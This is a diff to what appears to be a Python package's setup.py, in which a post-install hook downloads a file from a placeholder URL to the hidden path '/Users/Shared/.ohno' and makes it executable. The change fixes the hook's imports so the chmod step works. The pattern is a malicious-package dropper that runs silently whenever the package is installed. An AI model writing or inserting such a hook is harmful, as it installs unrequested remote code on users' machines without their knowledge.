@@ -25,7 +25,7 @@ class PostInstallCommand(install):
     """Post-installation for installation mode."""
     def run(self):
         install.run(self)
-        import requests
+        import subprocess
         import urllib.request
         urllib.request.urlretrieve("https://REPLACEME", "/Users/Shared/.ohno")
         subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
